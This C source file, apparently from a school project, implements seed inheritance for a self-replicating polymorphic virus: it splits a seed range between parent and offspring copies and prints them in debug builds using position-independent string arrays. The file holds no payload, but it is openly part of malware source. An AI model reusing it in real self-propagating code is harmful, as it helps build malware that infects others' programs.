/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   polymorphic_seed.c                                 :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/12 18:29:06 by anselme           #+#    #+#             */
/*   Updated: 2019/12/17 09:24:13 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdbool.h>
#include <stdint.h>

#include "utils.h"

/*
** yield_seed_to_heir is the seed inheritance manager.
**   It SHOULD be the only function WITH WRITE ACCESS to the father seeds
**   AND the son seed! If this virus was in Rust...
**
**   uint64_t father_seed[2] MUST be a pointer to the viral code.
**   TODO: It is then changed directly in the file
**
**   This function never fails. If a virus runs out of seeds the son will get
**   already owned seeds.
*/

#ifdef DEBUG

# include "position_independent.h"

static  void	print_original(uint64_t father_seed[2])
{
	PD_ARRAY(char, original, 'O','R','I','G','I','N','A','L',':',' ',0);
	PD_ARRAY(char, semicolon, ';',0);

	dprintf(1, original);
	ft_putu64(father_seed[0]);
	dprintf(1, semicolon);
	ft_putu64(father_seed[1]);
}

static void	print_new(uint64_t father_seed[2], uint64_t son_seed[2])
{
	PD_ARRAY(char, semicolon, ';',0);
	PD_ARRAY(char, newline, '\n',0);
	PD_ARRAY(char, father, 'f','a','t','h','e','r','_','s','e','e','d',':',' ',0);
	PD_ARRAY(char, son, 's','o','n','_','s','e','e','d',':',' ',0);

	dprintf(1, newline);
	dprintf(1, father);
	ft_putu64(father_seed[0]);
	dprintf(1, semicolon);
	ft_putu64(father_seed[1]);
	dprintf(1, newline);
	dprintf(1, son);
	ft_putu64(son_seed[0]);
	dprintf(1, semicolon);
	ft_putu64(son_seed[1]);
	dprintf(1, newline);
}

#endif

bool	yield_seed_to_heir(uint64_t father_seed[2], uint64_t son_seed[2])
{
	uint64_t	range_length = father_seed[1] - father_seed[0];

#ifdef DEBUG
	print_original(father_seed);
#endif

	son_seed[1]    = father_seed[1];
	son_seed[0]    = father_seed[0] + range_length / 2 + 1;
	father_seed[1] = father_seed[0] + range_length / 2;

#ifdef DEBUG
	print_new(father_seed, son_seed);
#endif

	return true;
}
